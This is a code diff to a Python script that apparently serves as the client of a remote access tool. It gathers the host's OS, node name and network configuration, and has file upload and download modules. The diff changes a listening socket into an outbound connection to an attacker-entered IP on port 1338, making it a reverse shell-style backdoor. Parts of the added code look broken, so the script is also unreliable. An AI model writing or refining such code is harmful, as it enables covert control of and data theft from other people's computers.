@@ -8,7 +8,7 @@ import pyautogui
 import fileupload
 import filedownload
 
-SERVER = "127.0.0.1"
+SERVER = input("IP: ")
 PORT = 1338
 CWD = os.getcwd()
 BUFFER_SIZE = 4096
@@ -19,10 +19,8 @@ SYSINFO = str(platform.system())
 NNAME = str(platform.node())
 VERSION = str(platform.version())
 
-x = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-x.bind((SERVER, PORT))
-x.listen(5)
-s, a = x.accept()
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((SERVER, PORT))
 system = SYSINFO
 
 def handleConn():
@@ -56,8 +54,8 @@ def handleConn():
             # Traverse the ipconfig information
             if system == "Windows":
                 data = subprocess.check_output(['ipconfig','/all']).decode('utf-8').split('\n')
-            else:
-                data = subprocess.check_output(['ifconfig']).decode('utf-8').split('\n')
+            elif system == "Linux" or "Mac" in system:
+                data = subprocess.check_output(['ifconfig && ip a']).decode('utf-8').split('\n')
             # Arrange the bytes data
             all = f"\nLocal IP: {LOCALIP}\n" + f"Hostname: {HOSTNAME}"
             data.append(all)
